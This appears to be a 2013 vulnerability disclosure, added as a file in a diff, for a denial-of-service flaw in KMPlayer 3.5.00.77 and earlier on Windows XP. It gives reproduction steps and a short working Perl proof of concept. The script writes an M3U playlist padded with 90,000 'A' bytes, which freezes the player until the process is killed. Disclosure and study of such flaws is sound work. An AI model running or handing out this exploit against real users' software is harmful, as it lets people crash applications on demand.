@@ -1,0 +1,24 @@
+Title : KMPlayer (PlayList M3U) Denial Of Service PoC All Versions
+Author : Jigsaw (Abdelmorite Eljoaydi)
+Date : 26-01-2013
+E-mail : jigsaw0658@gmail.com
+Home : Morroco	
+Facebook page : facebook.com/abdelmorit.alma
+platform : software
+Impact : Denial Of Service 
+Tested on : KMPlayer (http://www.kmpmedia.net/) Version 3.5.00.77 and below
+OS : Tested on Windows XP SP1,SP2 and SP3 'Windows 7 is not Vulnerable' other OS maybe Vulnerable           
+Risk : Low[+] / Medium[-]
+
+====How to reproduce====
+When creating a file with the poc below , you'll have to open the playlist file in kmplayer , a box will pop up just press OK . After that press the play button to trigger the DOS vulnerability . The program will not be able to respond until the process is killed using the task manager .
+
+=========Proof of concept===========
+#!/usr/bin/perl
+my $j = "\x41" x 90000;
+my $h = "\x4D\x33\x55";
+my $file = "kmplayer.m3u";
+open ($File, ">$file");
+print $File $h.$j;
+close ($File);
+====================================
